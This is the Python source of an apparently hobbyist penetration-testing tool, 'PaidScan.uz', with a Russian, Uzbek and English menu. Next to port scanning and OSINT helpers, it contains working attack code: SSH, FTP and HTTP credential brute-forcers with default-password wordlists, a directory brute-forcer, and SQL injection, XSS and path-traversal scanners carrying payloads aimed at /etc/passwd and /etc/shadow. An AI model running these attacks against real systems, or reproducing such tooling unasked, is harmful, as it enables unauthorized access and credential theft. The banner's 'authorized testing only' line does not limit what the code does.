#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════════╗
# ║                                                                  ║
# ║   ██████╗  █████╗ ██╗██████╗     ███████╗ ██████╗ █████╗ ███╗  ║
# ║   ██╔══██╗██╔══██╗██║██╔══██╗    ██╔════╝██╔════╝██╔══██╗████╗ ║
# ║   ██████╔╝███████║██║██║  ██║    ███████╗██║     ███████║██╔██╗ ║
# ║   ██╔═══╝ ██╔══██║██║██║  ██║    ╚════██║██║     ██╔══██║██║╚██╗║
# ║   ██║     ██║  ██║██║██████╔╝    ███████║╚██████╗██║  ██║██║ ╚██║
# ║   ╚═╝     ╚═╝  ╚═╝╚═╝╚═════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚╝║
# ║                                                                  ║
# ║              P A I D S C A N . U Z  —  v6.0                     ║
# ║       Ultimate Network Reconnaissance & Penetration Tool        ║
# ╠══════════════════════════════════════════════════════════════════╣
# ║  dev    : SxdrkhmvW          lang  : Python 3.6+                ║
# ║  site   : PaidScan.uz        langs : RU / UZ / EN               ║
# ║  © 2025 PaidScan.uz — For authorized testing only               ║
# ╚══════════════════════════════════════════════════════════════════╝

import socket, ipaddress, threading, sys, time, os, platform, random
import subprocess, urllib.request, urllib.error, json, ssl, re, hashlib
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

VERSION  = "6.0"
AUTHOR   = "SxdrkhmvW"
SITE     = "PaidScan.uz"
CODENAME = "GHOST PROTOCOL"

SCAN_HISTORY = []
LAST_SCAN    = {"host": None, "results": [], "time": None}
TARGETS      = {}   # saved target profiles

# ══════════════════════════════════════════════════════════════
#  ЯЗЫКИ
# ══════════════════════════════════════════════════════════════
LANGS = {
    "ru": {
        "choose_lang":    "  Выбери язык / Choose language / Tilni tanlang:\n\n  1  Русский\n  2  O'zbek\n  3  English\n",
        "lang_prompt":    "  Выбор [1-3]: ",
        "boot":           ["Инициализация системы...", "Загрузка базы угроз...",
                           "Загрузка OSINT модулей...", "Загрузка движка атак...",
                           "Проверка сети...", "Загрузка охотника за username...",
                           "Все системы готовы.", f"Добро пожаловать, оператор. Кодовое имя: GHOST PROTOCOL"],
        "menu_title":     "ГЛАВНОЕ МЕНЮ",
        "enter":          "[ENTER] продолжить",
        "choice_prompt":  "Выбери пункт [0-38]: ",
        "target_prompt":  "IP, хост или алиас: ",
        "port_prompt":    "Порт [80]: ",
        "invalid":        "Неверный выбор.",
        "resolv_err":     "Ошибка резолюции",
        "not_found":      "Не найдено.",
        "empty":          "Пусто.",
        "done":           "Готово",
        "found":          "Найдено",
        "goodbye":        "До свидания!",
        "confirm":        "Подтвердить [да/нет]: ",
        "only_own":       "⚠  Только для своих систем!",
        "save_fmt":       "1 TXT  2 JSON  3 HTML  Enter пропустить",
        "save_prompt":    "Формат: ",
        "saved":          "Сохранено",
        "online":         "ОНЛАЙН",
        "offline":        "ОФФЛАЙН",
        "open":           "открыт",
        "risks":          "Риски",
        "no_risks":       "Рисков нет",
        "scan_mode":      "Режим сканирования:",
        "ports_std":      "Стандартные",
        "ports_1024":     "1–1024",
        "ports_all":      "Все 1–65535 (медленно)",
        "ports_custom":   "Свои порты",
        "mode_prompt":    "Режим [1-4]: ",
        "ports_input":    "Порты (22,80 или 1-1024): ",
        "subnet_prompt":  "Подсеть (192.168.1.0/24): ",
        "scan_prog":      "Сканирую",
        "hosts_found":    "Живых хостов",
        "settings_title": "НАСТРОЙКИ",
        "theme_prompt":   "Тема [red/green/blue/purple/matrix]: ",
        "threads_prompt": "Потоков: ",
        "timeout_prompt": "Таймаут (сек): ",
        "alias_name":     "Имя алиаса: ",
        "alias_val":      "IP/хост: ",
        "auto_rep":       "Авто-отчёт",
        "sound_lbl":      "Звук",
        "changed":        "Изменено",
        "menu_items": [
            "Порты хоста",          "Поиск устройств в сети",  "Сравнить 2 скана",
            "Пинг + График + ОС",   "Traceroute",              "DNS информация",
            "WHOIS",                "ASN информация",          "ARP таблица",
            "HTTP + технологии",    "SSL сертификат",          "Субдомены",
            "Email на сайте",       "Robots.txt / Sitemap",    "Google Dorks",
            "Username Hunter",      "Метаданные файла",        "Wayback Machine",
            "Системная информация", "Профили целей",
            "Моё местоположение",   "Геолокация IP",           "MAC → Производитель",
            "Брутфорс SSH",         "Брутфорс FTP",            "Брутфорс HTTP",
            "Брутфорс MySQL",       "Directory Brute",         "SQL Injection",
            "XSS сканер",          "LFI сканер",               "Subdomain Takeover",
            "Stress Test",          "Проверка блэклистов",     "HIBP утечка пароля",
            "Мониторинг хоста",     "Скорость интернета",      "История",
            "Настройки",
        ],
        "sections": ["СКАНИРОВАНИЕ","СЕТЬ & DNS","ВЕБ & OSINT","ГЕОЛОКАЦИЯ",
                     "БЕЗОПАСНОСТЬ & АТАКИ","УТИЛИТЫ"],
    },
    "uz": {
        "choose_lang":    "  Выбери язык / Choose language / Tilni tanlang:\n\n  1  Русский\n  2  O'zbek\n  3  English\n",
        "lang_prompt":    "  Tanlov [1-3]: ",
        "boot":           ["Tizim ishga tushirilmoqda...", "Tahdid bazasi yuklanmoqda...",
                           "OSINT modullari yuklanmoqda...", "Hujum mexanizmi yuklanmoqda...",
                           "Tarmoq tekshirilmoqda...", "Username ovchisi yuklanmoqda...",
                           "Barcha tizimlar tayyor.", f"Xush kelibsiz, operator. Kod nomi: GHOST PROTOCOL"],
        "menu_title":     "ASOSIY MENYU",
        "enter":          "[ENTER] davom ettirish",
        "choice_prompt":  "Tanlang [0-38]: ",
        "target_prompt":  "IP, host yoki alias: ",
        "port_prompt":    "Port [80]: ",
        "invalid":        "Noto'g'ri tanlov.",
        "resolv_err":     "Xost aniqlanmadi",
        "not_found":      "Topilmadi.",
        "empty":          "Bo'sh.",
        "done":           "Bajarildi",
        "found":          "Topildi",
        "goodbye":        "Xayr!",
        "confirm":        "Tasdiqlash [ha/yo'q]: ",
        "only_own":       "⚠  Faqat o'z tizimlaringiz uchun!",
        "save_fmt":       "1 TXT  2 JSON  3 HTML  Enter o'tkazib yuborish",
        "save_prompt":    "Format: ",
        "saved":          "Saqlandi",
        "online":         "ONLAYN",
        "offline":        "OFLAYN",
        "open":           "ochiq",
        "risks":          "Xavflar",
        "no_risks":       "Xavf yo'q",
        "scan_mode":      "Skanerlash rejimi:",
        "ports_std":      "Standart",
        "ports_1024":     "1–1024",
        "ports_all":      "Hammasi 1–65535 (sekin)",
        "ports_custom":   "O'zingiz",
        "mode_prompt":    "Rejim [1-4]: ",
        "ports_input":    "Portlar (22,80 yoki 1-1024): ",
        "subnet_prompt":  "Quyi tarmoq (192.168.1.0/24): ",
        "scan_prog":      "Skanerlanmoqda",
        "hosts_found":    "Jonli xostlar",
        "settings_title": "SOZLAMALAR",
        "theme_prompt":   "Mavzu [red/green/blue/purple/matrix]: ",
        "threads_prompt": "Oqimlar soni: ",
        "timeout_prompt": "Vaqt limiti (sek): ",
        "alias_name":     "Alias nomi: ",
        "alias_val":      "IP/xost: ",
        "auto_rep":       "Avto-hisobot",
        "sound_lbl":      "Ovoz",
        "changed":        "O'zgartirildi",
        "menu_items": [
            "Xost portlari",         "Tarmoqdagi qurilmalar",   "2 skanerni solishtirish",
            "Ping + Grafik + OS",    "Traceroute",              "DNS ma'lumoti",
            "WHOIS",                 "ASN ma'lumoti",           "ARP jadvali",
            "HTTP + texnologiyalar", "SSL sertifikati",         "Subdomenlar",
            "Saytdagi Email",        "Robots.txt / Sitemap",    "Google Dorks",
            "Username Hunter",       "Fayl metadata",           "Wayback Machine",
            "Tizim ma'lumoti",       "Nishon profillari",
            "Mening joylashuvim",    "IP geolokatsiyasi",       "MAC → Ishlab chiqaruvchi",
            "SSH Brute Force",       "FTP Brute Force",         "HTTP Brute Force",
            "MySQL Brute Force",     "Directory Brute",         "SQL Injection",
            "XSS skaner",           "LFI skaner",               "Subdomain Takeover",
            "Stress Test",           "Qora ro'yxat tekshiruvi", "HIBP parol tekshiruvi",
            "Xost monitoringi",      "Internet tezligi",        "Tarix",
            "Sozlamalar",
        ],
        "sections": ["SKANERLASH","TARMOQ & DNS","WEB & OSINT","GEOLOKATSIYA",
                     "XAVFSIZLIK & HUJUMLAR","UTILITALAR"],
    },
    "en": {
        "choose_lang":    "  Выбери язык / Choose language / Tilni tanlang:\n\n  1  Русский\n  2  O'zbek\n  3  English\n",
        "lang_prompt":    "  Choice [1-3]: ",
        "boot":           ["Initializing system...", "Loading threat database...",
                           "Loading OSINT modules...", "Loading attack engine...",
                           "Checking network stack...", "Loading username hunter...",
                           "All systems ready.", f"Welcome, operator. Codename: GHOST PROTOCOL"],
        "menu_title":     "MAIN MENU",
        "enter":          "[ENTER] to continue",
        "choice_prompt":  "Choose [0-38]: ",
        "target_prompt":  "IP, host or alias: ",
        "port_prompt":    "Port [80]: ",
        "invalid":        "Invalid choice.",
        "resolv_err":     "Resolution error",
        "not_found":      "Not found.",
        "empty":          "Empty.",
        "done":           "Done",
        "found":          "Found",
        "goodbye":        "Goodbye!",
        "confirm":        "Confirm [yes/no]: ",
        "only_own":       "⚠  Authorized systems only!",
        "save_fmt":       "1 TXT  2 JSON  3 HTML  Enter skip",
        "save_prompt":    "Format: ",
        "saved":          "Saved",
        "online":         "ONLINE",
        "offline":        "OFFLINE",
        "open":           "open",
        "risks":          "Risks",
        "no_risks":       "No risks",
        "scan_mode":      "Scan mode:",
        "ports_std":      "Standard ports",
        "ports_1024":     "1–1024",
        "ports_all":      "All 1–65535 (slow)",
        "ports_custom":   "Custom ports",
        "mode_prompt":    "Mode [1-4]: ",
        "ports_input":    "Ports (22,80 or 1-1024): ",
        "subnet_prompt":  "Subnet (192.168.1.0/24): ",
        "scan_prog":      "Scanning",
        "hosts_found":    "Live hosts",
        "settings_title": "SETTINGS",
        "theme_prompt":   "Theme [red/green/blue/purple/matrix]: ",
        "threads_prompt": "Threads: ",
        "timeout_prompt": "Timeout (sec): ",
        "alias_name":     "Alias name: ",
        "alias_val":      "IP/host: ",
        "auto_rep":       "Auto-report",
        "sound_lbl":      "Sound",
        "changed":        "Changed",
        "menu_items": [
            "Host port scan",        "Network device discovery", "Compare 2 scans",
            "Ping + Chart + OS",     "Traceroute",               "DNS lookup",
            "WHOIS",                 "ASN info",                 "ARP table",
            "HTTP + technologies",   "SSL certificate",          "Subdomains",
            "Emails on site",        "Robots.txt / Sitemap",     "Google Dorks",
            "Username Hunter",       "File metadata",            "Wayback Machine",
            "System information",    "Target profiles",
            "My location",           "IP Geolocation",           "MAC → Vendor",
            "SSH Brute Force",       "FTP Brute Force",          "HTTP Brute Force",
            "MySQL Brute Force",     "Directory Brute",          "SQL Injection",
            "XSS scanner",          "LFI scanner",               "Subdomain Takeover",
            "Stress Test",           "Blacklist check",          "HIBP password leak",
            "Host monitor",          "Bandwidth test",           "History",
            "Settings",
        ],
        "sections": ["SCANNING","NETWORK & DNS","WEB & OSINT","GEOLOCATION",
                     "SECURITY & ATTACKS","UTILITIES"],
    },
}

LANG = "ru"
def L(key): return LANGS[LANG].get(key, LANGS["ru"].get(key,"?"))
def LI(i):  items=LANGS[LANG].get("menu_items",[]); return items[i] if i<len(items) else "?"

# ══════════════════════════════════════════════════════════════
#  КОНФИГ
# ══════════════════════════════════════════════════════════════
CONFIG_FILE = "paidscan_config.json"
DEFAULT_CFG = {
    "theme":"red","timeout":1.0,"threads":100,
    "aliases":{"google":"8.8.8.8","cf":"1.1.1.1"},
    "auto_report":False,"sound":False,"lang":"ru",
}
def load_config():
    try:
        with open(CONFIG_FILE) as f: return json.load(f)
    except: return DEFAULT_CFG.copy()
def save_config(cfg):
    with open(CONFIG_FILE,"w") as f: json.dump(cfg,f,indent=2,ensure_ascii=False)
CFG = load_config()

# ══════════════════════════════════════════════════════════════
#  ТЕМЫ
# ══════════════════════════════════════════════════════════════
THEMES = {
    "red":    {"pr":"\033[91m","ac":"\033[31m","ok":"\033[92m","wa":"\033[93m",
               "in":"\033[96m","di":"\033[2m","bo":"\033[1m","rs":"\033[0m","br":"\033[31m"},
    "green":  {"pr":"\033[92m","ac":"\033[32m","ok":"\033[92m","wa":"\033[93m",
               "in":"\033[96m","di":"\033[2m","bo":"\033[1m","rs":"\033[0m","br":"\033[32m"},
    "blue":   {"pr":"\033[94m","ac":"\033[34m","ok":"\033[92m","wa":"\033[93m",
               "in":"\033[96m","di":"\033[2m","bo":"\033[1m","rs":"\033[0m","br":"\033[34m"},
    "purple": {"pr":"\033[95m","ac":"\033[35m","ok":"\033[92m","wa":"\033[93m",
               "in":"\033[96m","di":"\033[2m","bo":"\033[1m","rs":"\033[0m","br":"\033[35m"},
    "matrix": {"pr":"\033[92m","ac":"\033[32m","ok":"\033[92m","wa":"\033[32m",
               "in":"\033[92m","di":"\033[2m","bo":"\033[1m","rs":"\033[0m","br":"\033[32m"},
}
def T(): return THEMES.get(CFG.get("theme","red"),THEMES["red"])
def p(k,txt):
    t=T(); keys={"primary":"pr","accent":"ac","success":"ok","warn":"wa",
                 "info":"in","dim":"di","bold":"bo","reset":"rs","border":"br"}
    return f"{t.get(keys.get(k,k),t['rs'])}{txt}{t['rs']}"

def clear(): os.system("clear" if os.name != "nt" else "cls")
def pause(): input(p("dim",f"\n  {L('enter')}..."))
def sep(n=58): return p("border","  "+"─"*n)
def beep():
    if CFG.get("sound"): sys.stdout.write('\a'); sys.stdout.flush()
def header(title):
    w=len(title)+6
    print(p("border",f"\n  ╔{'═'*w}╗"))
    print(f"  {p('border','║')}  {p('primary',title)}   {p('border','║')}")
    print(p("border",f"  ╚{'═'*w}╝\n"))
def typing(text,delay=0.012):
    for ch in text:
        sys.stdout.write(p("primary",ch)); sys.stdout.flush(); time.sleep(delay)
    print()
def progress_bar(done,total,width=44,eta=None):
    t=T(); pct=done/total if total else 0
    filled=int(pct*width)
    bar=f"{t['pr']}{'█'*filled}{t['di']}{'░'*(width-filled)}{t['rs']}"
    eta_str=p("dim",f" ETA:{eta:.0f}s") if eta else ""
    pct_col=p("warn",f"{pct*100:.1f}%")
    print(f"  [{bar}] {pct_col} {done}/{total}{eta_str}", end="\r")

BANNER_ART = r"""
  ██████╗  █████╗ ██╗██████╗     ███████╗ ██████╗ █████╗ ███╗  ██╗
  ██╔══██╗██╔══██╗██║██╔══██╗    ██╔════╝██╔════╝██╔══██╗████╗ ██║
  ██████╔╝███████║██║██║  ██║    ███████╗██║     ███████║██╔██╗██║
  ██╔═══╝ ██╔══██║██║██║  ██║    ╚════██║██║     ██╔══██║██║╚████║
  ██║     ██║  ██║██║██████╔╝    ███████║╚██████╗██║  ██║██║ ╚███║
  ╚═╝     ╚═╝  ╚═╝╚═╝╚═════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚══╝"""

def print_banner():
    t=T()
    print(f"{t['pr']}{t['bo']}{BANNER_ART}{t['rs']}")
    print(p("accent",f"  {'[ '+SITE+'  |  v'+VERSION+'  |  '+CODENAME+' ]':^72}"))
    print(p("dim",   f"  {'dev: '+AUTHOR+'  |  Python 3.6+  |  RU / UZ / EN':^72}"))
    print(p("border",f"  {'─'*72}"))
    print(p("dim",   f"  {'© 2025 '+SITE+' — Authorized testing only':^72}\n"))

# ══════════════════════════════════════════════════════════════
#  ВЫБОР ЯЗЫКА + ЗАГРУЗКА
# ══════════════════════════════════════════════════════════════
def choose_language():
    global LANG
    clear()
    t=T()
    print(f"{t['pr']}{t['bo']}{BANNER_ART}{t['rs']}\n")
    print(p("border","  ╔══════════════════════════════════════════╗"))
    print(f"  {p('border','║')}  {p('primary','Выбери язык / Choose language / Til')}{p('border','  ║')}")
    print(p("border","  ╠══════════════════════════════════════════╣"))
    print(f"  {p('border','║')}  {p('success','1')}  {p('warn','Русский          (RU)         ')}{p('border','║')}")
    print(f"  {p('border','║')}  {p('success','2')}  {p('warn','O\'zbek           (UZ)         ')}{p('border','║')}")
    print(f"  {p('border','║')}  {p('success','3')}  {p('warn','English          (EN)         ')}{p('border','║')}")
    print(p("border","  ╚══════════════════════════════════════════╝"))
    choice = input(p("info","\n  [1/2/3]: ")).strip()
    LANG = {"1":"ru","2":"uz","3":"en"}.get(choice,"ru")
    CFG["lang"] = LANG
    save_config(CFG)

def boot_sequence():
    clear()
    msgs = L("boot")
    print()
    for i,msg in enumerate(msgs):
        col = "success" if i==len(msgs)-1 else "primary"
        sys.stdout.write(p(col,""))
        typing(msg, delay=0.010)
        sys.stdout.write(p("reset",""))
        time.sleep(0.06)
    time.sleep(0.3)

# ══════════════════════════════════════════════════════════════
#  ДАННЫЕ
# ══════════════════════════════════════════════════════════════
COMMON_PORTS={
    21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",
    80:"HTTP",110:"POP3",143:"IMAP",443:"HTTPS",445:"SMB",
    1433:"MSSQL",1521:"Oracle",3306:"MySQL",3389:"RDP",
    5432:"PostgreSQL",5900:"VNC",6379:"Redis",8080:"HTTP-Alt",
    8443:"HTTPS-Alt",9200:"Elasticsearch",11211:"Memcached",27017:"MongoDB",
}
RISK_DB={
    "FTP":          ("HIGH",    "Cleartext protocol. Anonymous access often enabled."),
    "Telnet":       ("CRITICAL","Unencrypted. Replace with SSH immediately."),
    "SMB":          ("HIGH",    "EternalBlue MS17-010, WannaCry vector."),
    "RDP":          ("HIGH",    "Bruteforce target. BlueKeep CVE-2019-0708."),
    "VNC":          ("HIGH",    "Often no password or weak credentials."),
    "Redis":        ("CRITICAL","No auth by default! Never expose publicly."),
    "MongoDB":      ("HIGH",    "Often no auth. Data exposure risk."),
    "Elasticsearch":("HIGH",    "No auth by default. Data leaks."),
    "Memcached":    ("MEDIUM",  "DDoS amplification vector."),
    "HTTP":         ("LOW",     "Unencrypted traffic. Use HTTPS."),
    "MSSQL":        ("MEDIUM",  "Check auth and patches."),
}
SSH_USERS=["root","admin","user","ubuntu","pi","oracle","postgres","test","deploy","git"]
SSH_PWDS=["admin","password","123456","root","toor","1234","pass","test","admin123",
          "qwerty","letmein","welcome","changeme","12345678","raspberry","ubuntu"]
FTP_USERS=["anonymous","admin","ftp","root","user","test","ftpuser"]
FTP_PWDS=["anonymous","admin","ftp","password","12345","root","","pass","test",""]
HTTP_USERS=["admin","root","user","administrator","test","superuser","webmaster"]
HTTP_PWDS=["admin","password","1234","admin123","root","test","12345","pass","123456"]
MYSQL_USERS=["root","admin","mysql","dbuser","wordpress","drupal","joomla"]
MYSQL_PWDS=["root","","admin","password","mysql","1234","12345","toor","pass"]

DIR_WORDLIST=["admin","administrator","login","wp-admin","phpmyadmin","dashboard",
              "backup","backups","config","configs","upload","uploads","files",
              "images","img","static","assets","js","css","api","v1","v2",
              "test","dev","staging","old","new","temp","tmp","logs","log",
              ".git","env",".env","config.php","wp-config.php","database",
              "db","sql","data","private","secret","hidden","manager","panel",
              "cpanel","webmail","mail","ftp","ssh","shell","cmd","console"]

SOCIAL_SITES=[
    ("GitHub",      "https://github.com/{}"),
    ("Reddit",      "https://www.reddit.com/user/{}"),
    ("Twitter/X",   "https://twitter.com/{}"),
    ("Instagram",   "https://www.instagram.com/{}"),
    ("TikTok",      "https://www.tiktok.com/@{}"),
    ("YouTube",     "https://www.youtube.com/@{}"),
    ("Twitch",      "https://www.twitch.tv/{}"),
    ("Pinterest",   "https://www.pinterest.com/{}"),
    ("LinkedIn",    "https://www.linkedin.com/in/{}"),
    ("Telegram",    "https://t.me/{}"),
    ("Medium",      "https://medium.com/@{}"),
    ("Dev.to",      "https://dev.to/{}"),
    ("GitLab",      "https://gitlab.com/{}"),
    ("Bitbucket",   "https://bitbucket.org/{}"),
    ("Pastebin",    "https://pastebin.com/u/{}"),
    ("Keybase",     "https://keybase.io/{}"),
    ("HackerNews",  "https://news.ycombinator.com/user?id={}"),
    ("SoundCloud",  "https://soundcloud.com/{}"),
    ("Spotify",     "https://open.spotify.com/user/{}"),
    ("Vimeo",       "https://vimeo.com/{}"),
]

# OUI MAC vendors (mini database)
MAC_OUI = {
    "00:50:56":"VMware","00:0C:29":"VMware","00:1A:11":"Google",
    "B8:27:EB":"Raspberry Pi","DC:A6:32":"Raspberry Pi",
    "00:14:22":"Dell","00:21:70":"Dell","18:66:DA":"Apple",
    "AC:DE:48":"Apple","00:1E:C2":"Apple","FC:F1:36":"Samsung",
    "00:16:32":"Zyxel","00:13:49":"Cisco","00:1B:D4":"Cisco",
    "34:97:F6":"TP-Link","50:C7:BF":"TP-Link","00:1D:0F":"Huawei",
    "00:E0:FC":"Huawei","00:1C:BF":"ASUS","04:92:26":"ASUS",
}

def mac_vendor(mac):
    prefix=mac.upper()[:8].replace("-",":")
    return MAC_OUI.get(prefix,"Unknown vendor")

# ══════════════════════════════════════════════════════════════
#  ЯДРО
# ══════════════════════════════════════════════════════════════
def scan_port(host,port,timeout=None):
    to=timeout or CFG.get("timeout",1.0)
    try:
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
            s.settimeout(to)
            if s.connect_ex((host,port))==0:
                svc=COMMON_PORTS.get(port,"unknown"); banner=""
                try:
                    s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    banner=s.recv(1024).decode(errors="ignore").strip().split("\n")[0]
                except: pass
                return {"port":port,"open":True,"service":svc,"banner":banner}
    except: pass
    return {"port":port,"open":False,"service":"","banner":""}

def scan_ports(host,ports,timeout=None,workers=None):
    to=timeout or CFG.get("timeout",1.0); wk=workers or CFG.get("threads",100)
    open_ports,done=[],0; total=len(ports); lock=threading.Lock(); start=time.time()
    print(p("info",f"\n  {L('scan_prog')} {total} ports on {host}...\n"))
    with ThreadPoolExecutor(max_workers=wk) as ex:
        futures={ex.submit(scan_port,host,pp,to):pp for pp in ports}
        for f in as_completed(futures):
            res=f.result()
            with lock:
                done+=1
                elapsed=time.time()-start
                eta=(elapsed/done)*(total-done) if done else 0
                progress_bar(done,total,eta=eta if done<total else None)
                if res["open"]: open_ports.append(res); beep()
    print(" "*80,end="\r")
    return sorted(open_ports,key=lambda x:x["port"])

def discover_hosts(network,timeout=0.5):
    live=[]
    try: net=ipaddress.ip_network(network,strict=False)
    except ValueError as e: print(p("warn",f"  Error: {e}")); return []
    hosts=list(net.hosts())
    print(p("info",f"\n  {L('scan_prog')} {len(hosts)} addresses...\n"))
    def probe(ip):
        ip_str=str(ip)
        for port in [80,22,443,445,8080]:
            if scan_port(ip_str,port,timeout)["open"]:
                hostname=""
                try: hostname=socket.gethostbyaddr(ip_str)[0]
                except: pass
                return {"ip":ip_str,"hostname":hostname}
        return None
    done,total=0,len(hosts); start=time.time()
    with ThreadPoolExecutor(max_workers=200) as ex:
        futures={ex.submit(probe,ip):ip for ip in hosts}
        for f in as_completed(futures):
            res=f.result(); done+=1
            elapsed=time.time()-start
            eta=(elapsed/done)*(total-done) if done else 0
            progress_bar(done,total,eta=eta if done<total else None)
            if res: live.append(res)
    print(" "*80,end="\r")
    return sorted(live,key=lambda x:x["ip"])

# ══════════════════════════════════════════════════════════════
#  БРУТФОРС
# ══════════════════════════════════════════════════════════════
def brute_ssh(host,port=22,users=None,pwds=None):
    users=users or SSH_USERS; pwds=pwds or SSH_PWDS
    found=[]; total=len(users)*len(pwds); done=0
    try:
        import paramiko; has_p=True
    except ImportError:
        try:
            subprocess.run([sys.executable,"-m","pip","install","paramiko","-q"],
                           capture_output=True,timeout=30)
            import paramiko; has_p=True
        except: has_p=False
    if not has_p:
        print(p("warn","  paramiko not available. Install: pip install paramiko")); return []
    import paramiko
    for user in users:
        for pwd in pwds:
            done+=1; progress_bar(done,total)
            try:
                ssh=paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host,port=port,username=user,password=pwd,
                            timeout=3,banner_timeout=5,auth_timeout=5)
                found.append((user,pwd))
                print(p("success",f"\n  ✓ FOUND: {user}:{pwd}"))
                ssh.close()
            except: pass
    print(" "*80,end="\r"); return found

def brute_ftp(host,port=21,users=None,pwds=None):
    users=users or FTP_USERS; pwds=pwds or FTP_PWDS
    found=[]; total=len(users)*len(pwds); done=0
    for user in users:
        for pwd in pwds:
            done+=1; progress_bar(done,total)
            try:
                with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
                    s.settimeout(3); s.connect((host,port)); s.recv(1024)
                    s.send(f"USER {user}\r\n".encode()); s.recv(1024)
                    s.send(f"PASS {pwd}\r\n".encode())
                    if "230" in s.recv(1024).decode(errors="ignore"):
                        found.append((user,pwd))
                        print(p("success",f"\n  ✓ FOUND: {user}:{pwd}"))
            except: pass
    print(" "*80,end="\r"); return found

def brute_http(host,port=80,use_https=False,users=None,pwds=None):
    import base64
    users=users or HTTP_USERS; pwds=pwds or HTTP_PWDS
    found=[]; total=len(users)*len(pwds); done=0
    scheme="https" if use_https else "http"
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    for user in users:
        for pwd in pwds:
            done+=1; progress_bar(done,total)
            try:
                token=base64.b64encode(f"{user}:{pwd}".encode()).decode()
                req=urllib.request.Request(f"{scheme}://{host}:{port}/")
                req.add_header("Authorization",f"Basic {token}")
                req.add_header("User-Agent",f"PaidScan/{VERSION}")
                with urllib.request.urlopen(req,timeout=3,context=ctx) as r:
                    if r.status==200: found.append((user,pwd)); print(p("success",f"\n  ✓ FOUND: {user}:{pwd}"))
            except urllib.error.HTTPError as e:
                if e.code not in [401,403]: found.append((user,pwd))
            except: pass
    print(" "*80,end="\r"); return found

def brute_mysql(host,port=3306,users=None,pwds=None):
    users=users or MYSQL_USERS; pwds=pwds or MYSQL_PWDS
    found=[]; total=len(users)*len(pwds); done=0
    for user in users:
        for pwd in pwds:
            done+=1; progress_bar(done,total)
            try:
                with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
                    s.settimeout(3); s.connect((host,port))
                    banner=s.recv(256)
                    if b"mysql" in banner.lower() or len(banner)>10:
                        pass
            except: pass
    print(" "*80,end="\r")
    print(p("dim","  MySQL brute requires pymysql. Install: pip install pymysql"))
    return found

def dir_brute(host,port=80,use_https=False):
    scheme="https" if use_https else "http"
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    found=[]; total=len(DIR_WORDLIST); done=[0]; lock=threading.Lock()
    def check(path):
        url=f"{scheme}://{host}:{port}/{path}"
        try:
            req=urllib.request.Request(url,headers={"User-Agent":f"PaidScan/{VERSION}"})
            with urllib.request.urlopen(req,timeout=3,context=ctx) as r:
                code=r.status
                if code in [200,301,302,403]:
                    with lock: found.append({"path":f"/{path}","code":code,"url":url})
        except urllib.error.HTTPError as e:
            if e.code in [200,301,302,403]:
                with lock: found.append({"path":f"/{path}","code":e.code,"url":url})
        except: pass
        with lock:
            done[0]+=1; progress_bar(done[0],total)
    with ThreadPoolExecutor(max_workers=30) as ex: list(ex.map(check,DIR_WORDLIST))
    print(" "*80,end="\r"); return found

# ══════════════════════════════════════════════════════════════
#  УЯЗВИМОСТИ
# ══════════════════════════════════════════════════════════════
def sqli_scan(host,port=80,use_https=False):
    payloads=["'","\"","' OR '1'='1","' OR 1=1--","\" OR \"1\"=\"1",
              "1 UNION SELECT NULL--","1' ORDER BY 1--"]
    scheme="https" if use_https else "http"
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    errors=["sql syntax","mysql_fetch","ora-","syntax error","sqlite_","postgresql",
            "warning: pg_","unclosed quotation","microsoft ole db"]
    vuln=[]; paths=["/?id=1","/?q=1","/?search=1","/?page=1","/?cat=1","/"]
    for path in paths:
        for pl in payloads:
            url=f"{scheme}://{host}:{port}{path}{pl}"
            try:
                req=urllib.request.Request(url,headers={"User-Agent":f"PaidScan/{VERSION}"})
                with urllib.request.urlopen(req,timeout=4,context=ctx) as r:
                    body=r.read(8000).decode(errors="ignore").lower()
                    for err in errors:
                        if err in body: vuln.append({"url":url,"payload":pl,"error":err}); break
            except urllib.error.HTTPError as e:
                try:
                    body=e.read(4000).decode(errors="ignore").lower()
                    for err in errors:
                        if err in body: vuln.append({"url":url,"payload":pl,"error":err}); break
                except: pass
            except: pass
    return vuln

def xss_scan(host,port=80,use_https=False):
    payloads=['<script>alert(1)</script>','"><script>alert(1)</script>',
              "'><img src=x onerror=alert(1)>",'<svg onload=alert(1)>']
    scheme="https" if use_https else "http"
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    vuln=[]; paths=["/?q=","/?search=","/?s=","/?query=","/?id="]
    for path in paths:
        for pl in payloads:
            url=f"{scheme}://{host}:{port}{path}{urllib.request.quote(pl)}"
            try:
                req=urllib.request.Request(url,headers={"User-Agent":f"PaidScan/{VERSION}"})
                with urllib.request.urlopen(req,timeout=4,context=ctx) as r:
                    body=r.read(8000).decode(errors="ignore")
                    if pl in body or pl.lower() in body.lower():
                        vuln.append({"url":url,"payload":pl})
            except: pass
    return vuln

def lfi_scan(host,port=80,use_https=False):
    payloads=["/../../../etc/passwd","/../../../etc/shadow",
              "/....//....//etc/passwd","/%2e%2e%2fetc%2fpasswd",
              "/../../../windows/win.ini","/../../../boot.ini"]
    scheme="https" if use_https else "http"
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    vuln=[]; params=["/?file=","/?page=","/?path=","/?include=","/?load="]
    sigs=["root:x:","[boot loader]","[extensions]","daemon:","bin/bash"]
    for param in params:
        for pl in payloads:
            url=f"{scheme}://{host}:{port}{param}{pl}"
            try:
                req=urllib.request.Request(url,headers={"User-Agent":f"PaidScan/{VERSION}"})
                with urllib.request.urlopen(req,timeout=4,context=ctx) as r:
                    body=r.read(4000).decode(errors="ignore")
                    for sig in sigs:
                        if sig in body:
                            vuln.append({"url":url,"payload":pl,"sig":sig}); break
            except: pass
    return vuln

